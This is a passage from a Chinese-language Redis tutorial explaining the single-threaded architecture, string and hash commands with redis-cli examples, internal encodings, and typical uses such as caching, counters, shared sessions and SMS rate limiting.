<li>其二：不同 内部编码 可以在 不同场景 下发挥各自的 优势。例如 ziplist 比较 节省内存，但是在列表 元素比较多 的情况下，性能 会有所 下降，这时候 Redis 会根据 配置，将列表类型的 内部实现 转换为 linkedlist。</li>
</ul>
<h3 id="单线程架构"><a href="#单线程架构" class="headerlink" title="单线程架构"></a>单线程架构</h3><p>Redis 使用了 单线程架构 和 I/O 多路复用模型 来实现 高性能 的 内存数据库服务。那为什么 单线程 还能这么快，下面分析原因：</p>
<h4 id="1、纯内存访问"><a href="#1、纯内存访问" class="headerlink" title="1、纯内存访问"></a>1、纯内存访问</h4><p>Redis 将所有数据放在 内存 中，内存的 响应时长 大约为 100 纳秒，这是 Redis 达到 每秒万级别 访问的重要基础。</p>
<h4 id="2、非阻塞-I-O"><a href="#2、非阻塞-I-O" class="headerlink" title="2、非阻塞 I/O"></a>2、非阻塞 I/O</h4><p>Redis 使用 <strong>epoll</strong> 作为 I/O 多路复用技术 的实现，再加上 Redis 自身的 事件处理模型 将 epoll 中的 连接、读写、关闭 都转换为 事件，从而不用不在 网络 I/O 上浪费过多的时间，如图所示：</p>
<figure class="image-box">
                <img src="1660be813703e6b6.png" alt title class>
                <p></p>
            </figure>

<h4 id="3、单线程避免线程切换和竞态产生的消耗"><a href="#3、单线程避免线程切换和竞态产生的消耗" class="headerlink" title="3、单线程避免线程切换和竞态产生的消耗"></a>3、单线程避免线程切换和竞态产生的消耗</h4><p>采用 单线程 就能达到如此 高的性能，那么不失为一种不错的选择，因为 单线程 能带来几个好处：</p>
<ul>
<li>单线程 可以简化 数据结构和算法 的实现，开发人员不需要了解复杂的 并发数据结构。</li>
<li>单线程 避免了 线程切换 和 竞态 产生的消耗，对于服务端开发来说，锁和线程切换 通常是性能杀手。</li>
</ul>
<blockquote>
<p>单线程 的问题：对于 每个命令 的 执行时间 是有要求的。如果某个命令 执行过长，会造成其他命令的 阻塞，对于 Redis 这种 高性能 的服务来说是致命的，所以 Redis 是面向 快速执行 场景的数据库。</p>
</blockquote>
<h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>本文堆 Redis 的几种 数据结构 进行了概述，介绍了几个简单的 全局命令，数据结构 和 内部编码 以及 单线程命令 处理机制分析。</p>
<hr>
<h1 id="数据结构之字符串"><a href="#数据结构之字符串" class="headerlink" title="数据结构之字符串"></a>数据结构之字符串</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>字符串类型 是 Redis 最基础的数据结构。字符串类型 的值实际可以是 字符串（简单 和 复杂 的字符串，例如 JSON、XML）、数字（整数、浮点数），甚至是 二进制（图片、音频、视频），但是值最大不能超过 <strong>512MB</strong> 。</p>
<h2 id="正文-4"><a href="#正文-4" class="headerlink" title="正文"></a>正文</h2><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><h5 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h5><blockquote>
<p><code>set key value [ex seconds] [px milliseconds] [nx|xx]</code></p>
</blockquote>
<p><code>set</code> 命令有几个选项：</p>
<ol>
<li><code>ex seconds</code>：为 键 设置 秒级过期时间。</li>
<li><code>px milliseconds</code>：为 键 设置 毫秒级过期时间。</li>
<li><code>nx</code>：键必须 不存在，才可以设置成功，用于 添加。</li>
<li><code>xx</code>：与 nx 相反，键必须 存在，才可以设置成功，用于 更新。</li>
</ol>
<p>除了 set 选项，Redis 还提供了 <code>setex</code> 和 <code>setnx</code> 两个命令：</p>
<blockquote>
<p><code>setex key seconds value</code><br><code>setnx key value</code></p>
</blockquote>
<ul>
<li><p><code>setex</code>：设定键的值，并指定此键值对应的 有效时间。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; setex key1 5 value1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">"value1"</span></span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>setnx</code>：键必须 不存在，才可以设置成功。如果键已经存在，返回 0。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key2 value1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; setnx key2 value2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">"value1"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h5><blockquote>
<p><code>get key</code></p>
</blockquote>
<p>如果要获取的 键不存在，则返回 <strong>nil</strong>（空）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get not_exist_key</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<h5 id="批量设置值"><a href="#批量设置值" class="headerlink" title="批量设置值"></a>批量设置值</h5><blockquote>
<p><code>mset key value [key value ...]</code></p>
</blockquote>
<p>下面操作通过 <code>mset</code> 命令一次性设置 4 个 键值对：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; mset a 1 b 2 c 3 d 4</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h5 id="批量获取值"><a href="#批量获取值" class="headerlink" title="批量获取值"></a>批量获取值</h5><blockquote>
<p><code>mget key [key ...]</code></p>
</blockquote>
<p>通过下面操作 批量获取 键 a、b、c、d 的值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; mget a b c d</span><br><span class="line">1) <span class="string">"1"</span></span><br><span class="line">2) <span class="string">"2"</span></span><br><span class="line">3) <span class="string">"3"</span></span><br><span class="line">4) <span class="string">"4"</span></span><br></pre></td></tr></table></figure>

<p>批量操作 命令，可以有效提高 开发效率，假如没有 <code>mget</code> 这样的命令，要执行 n 次 get 命令的过程和 耗时 如下：</p>
<blockquote>
<p>n 次 get 时间 = n 次网络时间 + n 次命令时间</p>
</blockquote>
<figure class="image-box">
                <img src="1660be8136f2af81.png" alt title class>
                <p></p>
            </figure>

<p>使用 <code>mget</code> 命令后，执行 n 次 get 命令的过程和 耗时 如下：</p>
<blockquote>
<p>n 次 get 时间 = 1 次网络时间 + n 次命令时间</p>
</blockquote>
<figure class="image-box">
                <img src="1660be81370d0cc2.png" alt title class>
                <p></p>
            </figure>

<p>Redis 可以支撑 每秒数万 的 读写操作，但这指的是 Redis 服务端 的处理能力，对于 客户端 来说，一次命令除了 命令时间 还是有 网络时间。  </p>
<p>假设 网络时间 为 1 毫秒，命令时间为 0.1 毫秒（按照每秒处理 1 万条命令算），那么执行 1000 次 get 命令和 1 次 mget 命令的区别如表所示：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>时间</th>
</tr>
</thead>
<tbody><tr>
<td>1000 次 get 操作</td>
<td>1000 * 1 + 1000 * 0.1 = 1100ms = 1.1s</td>
</tr>
<tr>
<td>1 次 mget 操作</td>
<td>1 * 1 + 1000 * 0.1 = 101ms = 0.101s</td>
</tr>
</tbody></table>
<h5 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h5><blockquote>
<p><code>incr key</code></p>
</blockquote>
<p><code>incr</code> 命令用于对值做 自增操作，返回结果分为三种情况：</p>
<ul>
<li>值<strong>不是 整数</strong>，返回 <strong>错误</strong>。</li>
<li>值<strong>是 整数</strong>，返回 <strong>自增</strong> 后的结果。</li>
<li>键<strong>不存在</strong>，按照值为 0 自增，返回结果为 <strong>1</strong>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exists key</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; incr key</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>除了 <code>incr</code> 命令，Redis 还提供了 <code>decr</code>（自减）、<code>incrby</code>（自增指定数字）、<code>decrby</code>（自减指定数字）、<code>incrbyfloat</code>（自增浮点数）等命令操作：</p>
<blockquote>
<p><code>decr key</code><br><code>incrby key increment</code><br><code>decrby key decrement</code><br><code>incrbyfloat key increment</code></p>
</blockquote>
<p>很多 存储系统 和 编程语言 内部使用 CAS 机制实现 计数功能，会有一定的 CPU 开销。但在 Redis 中完全不存在这个问题，因为 Redis 是 单线程架构，任何命令到了 Redis 服务端 都要 顺序执行。</p>
<h4 id="不常用命令"><a href="#不常用命令" class="headerlink" title="不常用命令"></a>不常用命令</h4><h5 id="追加值"><a href="#追加值" class="headerlink" title="追加值"></a>追加值</h5><blockquote>
<p><code>append key value</code></p>
</blockquote>
<p><code>append</code> 可以向 字符串尾部 追加值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get key</span><br><span class="line"><span class="string">"redis"</span></span><br><span class="line">127.0.0.1:6379&gt; append key world</span><br><span class="line">(<span class="built_in">integer</span>) 10</span><br><span class="line">127.0.0.1:6379&gt; get key</span><br><span class="line"><span class="string">"redisworld"</span></span><br></pre></td></tr></table></figure>

<h5 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h5><blockquote>
<p><code>strlen key</code></p>
</blockquote>
<p>比如说，当前值为 redisworld，所以返回值为 10：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get key</span><br><span class="line"><span class="string">"redisworld"</span></span><br><span class="line">127.0.0.1:6379&gt; strlen key</span><br><span class="line">(<span class="built_in">integer</span>) 10</span><br></pre></td></tr></table></figure>

<h5 id="设置并返回原值"><a href="#设置并返回原值" class="headerlink" title="设置并返回原值"></a>设置并返回原值</h5><blockquote>
<p><code>getset key value</code></p>
</blockquote>
<p><code>getset</code> 和 <code>set</code> 一样会 设置值，但是不同的是，它同时会返回 键原来的值，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; getset hello world</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; getset hello redis</span><br><span class="line"><span class="string">"world"</span></span><br></pre></td></tr></table></figure>

<h5 id="设置指定位置的字符"><a href="#设置指定位置的字符" class="headerlink" title="设置指定位置的字符"></a>设置指定位置的字符</h5><blockquote>
<p><code>setrange key offeset value</code></p>
</blockquote>
<p>下面操作将值由 pest 变为了 best：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> redis pest</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; setrange redis 0 b</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; get redis</span><br><span class="line"><span class="string">"best"</span></span><br></pre></td></tr></table></figure>

<h5 id="获取部分字符串"><a href="#获取部分字符串" class="headerlink" title="获取部分字符串"></a>获取部分字符串</h5><blockquote>
<p><code>getrange key start end</code></p>
</blockquote>
<p><code>start</code> 和 <code>end</code> 分别是 开始 和 结束 的 偏移量，偏移量 从 0 开始计算，例如获取值 best 的 前两个字符 的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; getrange redis 0 1</span><br><span class="line"><span class="string">"be"</span></span><br></pre></td></tr></table></figure>

<p>最后给出 字符串 类型命令的 时间复杂度 说明：</p>
<figure class="image-box">
                <img src="1660c13bbc201ed4.png" alt title class>
                <p></p>
            </figure>

<h3 id="内部编码"><a href="#内部编码" class="headerlink" title="内部编码"></a>内部编码</h3><p>字符串 类型的 内部编码 有 3 种：</p>
<ul>
<li><code>int</code>：<strong>8 个字节</strong>的 <strong>长整型</strong>。</li>
<li><code>embstr</code>：<strong>小于等于 39 个字节</strong>的字符串。</li>
<li><code>raw</code>：<strong>大于 39 个字节</strong>的字符串。</li>
</ul>
<p>Redis 会根据当前值的 类型 和 长度 决定使用哪种 内部编码实现。</p>
<ul>
<li><p>整数类型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key 8653</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line"><span class="string">"int"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>短字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#小于等于 39 个字节的字符串：embstr</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key <span class="string">"hello,world"</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line"><span class="string">"embstr"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>长字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#大于 39 个字节的字符串：raw</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key <span class="string">"one string greater than 39 byte........."</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line"><span class="string">"raw"</span></span><br><span class="line">127.0.0.1:6379&gt; strlen key</span><br><span class="line">(<span class="built_in">integer</span>) 40</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h3><h4 id="缓存功能"><a href="#缓存功能" class="headerlink" title="缓存功能"></a>缓存功能</h4><p>下面是一种比较典型的 缓存 使用场景，其中 Redis 作为 缓存层，MySQL 作为 存储层，绝大部分请求的数据都是从 Redis 中获取。由于 Redis 具有支撑 高并发 的特性，所以缓存通常能起到 加速读写 和 降低后端压力 的作用。</p>
<figure class="image-box">
                <img src="16627f1779bef93b.png" alt title class>
                <p></p>
            </figure>

<p>整个功能的伪代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UserInfo <span class="title">getUserInfo</span><span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    String userRedisKey = <span class="string">"user:info:"</span> + id;</span><br><span class="line">    String value = redis.get(userRedisKey);</span><br><span class="line">    UserInfo userInfo;    </span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">        userInfo = deserialize(value);     </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line">        userInfo = mysql.get(id);   <span class="keyword">if</span> (userInfo != <span class="keyword">null</span>) &#123; </span><br><span class="line">            redis.setex(userRedisKey, <span class="number">3600</span>, serialize(userInfo));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> userInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="计数-1"><a href="#计数-1" class="headerlink" title="计数"></a>计数</h4><p>许多应用都会使用 Redis 作为 计数 的基础工具，它可以实现 快速计数、查询缓存 的功能，同时数据可以 异步落地 到其他 数据源。一般来说，视频播放数系统，就是使用 Redis 作为 视频播放数计数 的基础组件，用户每播放一次视频，相应的视频播放数就会自增 1。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">incrVideoCounter</span> <span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    String key = <span class="string">"video:playCount:"</span> + id;</span><br><span class="line">    <span class="keyword">return</span> redis.incr(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>实际上，一个真实的 计数系统 要考虑的问题会很多：防作弊、按照 不同维度 计数，数据持久化 到 底层数据源等。</p>
</blockquote>
<h4 id="共享-Session"><a href="#共享-Session" class="headerlink" title="共享 Session"></a>共享 Session</h4><p>一个 分布式 Web 服务将用户的 Session 信息（例如 用户登录信息）保存在 各自 的服务器中。这样会造成一个问题，出于 负载均衡 的考虑，分布式服务 会将用户的访问 均衡 到不同服务器上，用户 刷新一次访问 可能会发现需要 重新登录，这个问题是用户无法容忍的。</p>
<figure class="image-box">
                <img src="16627f1779cb4f2a.png" alt title class>
                <p></p>
            </figure>

<p>为了解决这个问题，可以使用 Redis 将用户的 Session 进行 集中管理。在这种模式下，只要保证 Redis 是 高可用 和 扩展性的，每次用户 更新 或者 查询 登录信息都直接从 Redis 中集中获取。</p>
<figure class="image-box">
                <img src="16627f1779a6030d.png" alt title class>
                <p></p>
            </figure>

<h4 id="限速"><a href="#限速" class="headerlink" title="限速"></a>限速</h4><p>很多应用出于安全的考虑，会在每次进行登录时，让用户输入 手机验证码，从而确定是否是用户本人。但是为了 短信接口 不被 频繁访问，会 限制 用户每分钟获取 验证码 的频率。例如一分钟不能超过 5 次。  </p>
<p>此功能可以使用 Redis 来实现，伪代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String phoneNum = <span class="string">"138xxxxxxxx"</span>;</span><br><span class="line">String key = <span class="string">"shortMsg:limit:"</span> + phoneNum;</span><br><span class="line"><span class="comment">// SET key value EX 60 NX</span></span><br><span class="line"><span class="keyword">boolean</span> isExists = redis.set(key, <span class="number">1</span>, <span class="string">"EX 60"</span>, <span class="string">"NX"</span>);</span><br><span class="line"><span class="keyword">if</span> (isExists != <span class="keyword">null</span> || redis.incr(key) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="comment">// 通过</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 限速</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述就是利用 Redis 实现了 限速功能，例如 一些网站 限制一个 IP 地址不能在 一秒钟之内 访问超过 n 次也可以采用 类似 的思路。</p>
<h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>本文简单的介绍了 Redis 的 字符串数据结构 的 基本命令，内部编码 和 相关应用场景。</p>
<hr>
<h1 id="数据结构之哈希"><a href="#数据结构之哈希" class="headerlink" title="数据结构之哈希"></a>数据结构之哈希</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>大部分编程语言都提供了 哈希（hash）类型，它们的叫法可能是 哈希、字典、关联数组。在 Redis 中，哈希类型 是指键值本身又是一个 键值对结构。  </p>
<p>哈希 形如 <code>value = { {field1, value1}, ...{fieldN, valueN} }</code>，Redis 键值对 和 哈希类型 二者的关系如图所示：</p>
<figure class="image-box">
                <img src="1663a75da4aca1ed.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>哈希类型中的 映射关系 叫作 <strong>field-value</strong>，这里的 value 是指 field 对应的 值，不是 键 对应的值。</p>
</blockquote>
<h2 id="正文-5"><a href="#正文-5" class="headerlink" title="正文"></a>正文</h2><h3 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="设置值-1"><a href="#设置值-1" class="headerlink" title="设置值"></a>设置值</h5><blockquote>
<p><code>hset key field value</code></p>
</blockquote>
<p>下面为 user：1 添加一对 field-value，如果设置成功会返回 1，反之会返回 0。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hset user:1 name tom</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>此外 Redis 提供了 <code>hsetnx</code> 命令，它们的关系就像 <code>set</code> 和 <code>setnx</code> 命令一样，只不过 作用域 由 键 变为 field。</p>
<h5 id="获取值-1"><a href="#获取值-1" class="headerlink" title="获取值"></a>获取值</h5><blockquote>
<p><code>hget key field</code></p>
</blockquote>
<p>下面操作用于获取 user：1 的 name 域（属性） 对应的值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hget user:1 name</span><br><span class="line"><span class="string">"tom"</span></span><br></pre></td></tr></table></figure>

<p>如果 键 或 field 不存在，会返回 nil：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hget user:2 name</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; hget user:1 age</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<h5 id="删除-field"><a href="#删除-field" class="headerlink" title="删除 field"></a>删除 field</h5><blockquote>
<p><code>hdel key field [field ...]</code></p>
</blockquote>
<p><code>hdel</code> 会删除 一个或多个 field，返回结果为 成功删除 field 的个数，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hdel user:1 name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hdel user:1 age</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<h5 id="计算-field-个数"><a href="#计算-field-个数" class="headerlink" title="计算 field 个数"></a>计算 field 个数</h5><blockquote>
<p><code>hlen key</code></p>
</blockquote>
<p>例如键 user：1 有 3 个 field：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hset user:1 name tom</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hset user:1 age 23</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hset user:1 city chengdu</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; hlen user:1</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br></pre></td></tr></table></figure>

<h5 id="批量设置或获取-field-value"><a href="#批量设置或获取-field-value" class="headerlink" title="批量设置或获取 field-value"></a>批量设置或获取 field-value</h5><blockquote>
<p><code>hmget key field [field ...]</code><br><code>hmset key field value [field value ...]</code></p>
</blockquote>
<p><code>hmset</code> 和 <code>hmget</code> 分别是 批量设置 和 获取 field-value，<code>hmset</code> 需要的参数是 key 和 多对 field-value，<code>hmget</code> 需要的参数是 key 和 多个 field。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset user:1 name tom age 12 city chengdu</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hmget user:1 name city</span><br><span class="line">1) <span class="string">"tom"</span></span><br><span class="line">2) <span class="string">"chengdu"</span></span><br></pre></td></tr></table></figure>

<h5 id="判断-field-是否存在"><a href="#判断-field-是否存在" class="headerlink" title="判断 field 是否存在"></a>判断 field 是否存在</h5><blockquote>
<p><code>hexists key field</code></p>
</blockquote>
<p>例如 user：1 包含 name 域，所以返回结果为 1，不包含时返回 0：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hexists user:1 name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<h5 id="获取所有-field"><a href="#获取所有-field" class="headerlink" title="获取所有 field"></a>获取所有 field</h5><blockquote>
<p><code>hkeys key</code></p>
</blockquote>
<p><code>hkeys</code> 命令应该叫 hfields 更为恰当，它返回指定 哈希键 所有的 field，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hkeys user:1</span><br><span class="line">1) <span class="string">"name"</span></span><br><span class="line">2) <span class="string">"age"</span></span><br><span class="line">3) <span class="string">"city"</span></span><br></pre></td></tr></table></figure>

<h5 id="获取所有-value"><a href="#获取所有-value" class="headerlink" title="获取所有 value"></a>获取所有 value</h5><blockquote>
<p><code>hvals key</code></p>
</blockquote>
<p>下面操作获取 user：1 的全部 value：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hvals user:1</span><br><span class="line">1) <span class="string">"tom"</span></span><br><span class="line">2) <span class="string">"12"</span></span><br><span class="line">3) <span class="string">"chengdu"</span></span><br></pre></td></tr></table></figure>

<h5 id="获取所有的-field-value"><a href="#获取所有的-field-value" class="headerlink" title="获取所有的 field-value"></a>获取所有的 field-value</h5><blockquote>
<p><code>hgetall key</code></p>
</blockquote>
<p>下面操作获取 user:1 所有的 field-value：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hgetall user:1</span><br><span class="line">1) <span class="string">"name"</span></span><br><span class="line">2) <span class="string">"tom"</span></span><br><span class="line">3) <span class="string">"age"</span></span><br><span class="line">4) <span class="string">"12"</span></span><br><span class="line">5) <span class="string">"city"</span></span><br><span class="line">6) <span class="string">"chengdu"</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在使用 <code>hgetall</code> 时，如果 哈希元素 个数比较多，会存在 阻塞 Redis 的可能。如果开发人员只需要获取 部分 field，可以使用 <code>hmget</code> ，如果一定要获取 全部 field-value，可以使用 <code>hscan</code> 命令，该命令会 渐进式遍历 哈希类型。</p>
</blockquote>
<h4 id="不常用命令-1"><a href="#不常用命令-1" class="headerlink" title="不常用命令"></a>不常用命令</h4><h5 id="键值自增"><a href="#键值自增" class="headerlink" title="键值自增"></a>键值自增</h5><blockquote>
<p><code>hincrby key field</code><br><code>hincrbyfloat key field</code></p>
</blockquote>
<p><code>hincrby</code> 和 <code>hincrbyfloat</code> ，就像 <code>incrby</code> 和 <code>incrbyfloat</code> 命令一样，但是它们的 作用域 是 field。</p>
<h5 id="计算-value-的字符串长度"><a href="#计算-value-的字符串长度" class="headerlink" title="计算 value 的字符串长度"></a>计算 value 的字符串长度</h5><blockquote>
<p><code>hstrlen key field</code></p>
</blockquote>
<p>例如 <code>hget user:1 name</code> 的 value 是 tom，那么 <code>hstrlen</code> 的返回结果是 3。</p>
